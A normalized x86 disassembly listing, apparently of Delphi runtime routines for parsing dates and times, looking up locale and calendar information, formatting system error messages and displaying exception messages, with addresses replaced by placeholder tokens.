sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409d54
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b90
test eax eax
jne r-xdata
push ebp
call sub_409dcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d34
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d34
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c5b0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0b4
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409cf0
pop ecx
jmp r-xdata
push ebp
call sub_409dcc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409cb4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d34
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408b90
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408b90
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408b90
test eax eax
jne r-xdata
jmp r-xdata
sub_40a868
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a0b4
pop ecx
push ebp
mov eax ebx
call sub_40a0b4
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404030
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a8d8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404200
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a8fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a8d8
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404200
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a990
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aa09
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aa10
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a8d8
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404200
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404460
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4080b0
test eax eax
jne r-xdata
mov eax edi
call sub_404200
add [ esi ] eax
mov bl 0x1
sub_40aa1c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a8d8
mov eax esi
call sub_404200
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40aa54
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404200
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40aaa0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404200
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c5f4
mov [ ebx ] eax
jmp r-xdata
sub_40aae8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404400
push eax
mov eax [ ebx ]
call sub_404400
pop edx
call sub_40c768
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ab3c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409cdc
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ab98
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40aeb3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40aa54
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c6a4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a8fc
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40aaa0
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404460
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408120
mov eax [ ebp - 0x1c ]
call sub_40aae8
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aeba
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f64
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa1c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a8fc
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa1c
test al al
je r-xdata
call sub_409cdc
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a8fc
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409a80
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404544
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aa1c
mov edx ebx
mov eax esi
call sub_40a8d8
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404200
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40aaa0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ab3c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a8d8
mov eax esi
call sub_404200
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409cdc
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404200
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404460
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4080b0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404200
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404460
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4080b0
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40aedc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a990
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a990
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a990
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a8fc
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a8d8
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a990
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa1c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a8fc
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a990
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa1c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a8d8
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409978
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a990
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a8fc
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a990
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aa1c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a990
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a8fc
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b0d0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ab98
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404200
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b104
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aedc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404200
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b138
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ab98
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b104
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404200
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40aedc
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b1c4
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404030
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b210
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f94
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404030
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b25c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b284
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b210
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405d94
sub_40b2c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b3d3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b284
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f94
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b284
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f94
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b284
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f94
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b284
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f94
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3da
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f64
retn
sub_40b3e4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404138
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b420
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b485
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404138
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408500
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b48c
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
inc ebx
sub_40b498
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b52f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b210
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408500
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b536
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b3e4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b420
call EnumCalendarInfoA
sub_40b548
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b712
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f40
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b210
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408500
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404200
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b719
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f64
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408b90
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c5b8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404460
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404208
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f94
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408b90
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404208
inc ebx
jmp r-xdata
mov eax esi
call sub_404200
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408b90
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404208
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404208
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404208
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404128
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404208
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404128
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404208
sub_40b77c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b770
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c808
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408ab4
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405300
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4030bc
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4090d8
mov eax [ ebp - 0x4 ]
call sub_408a50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404400
mov ebx eax
mov eax ebx
call sub_408a50
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b904
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b77c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405300
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4029d0
call sub_402844
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408a50
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b9cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
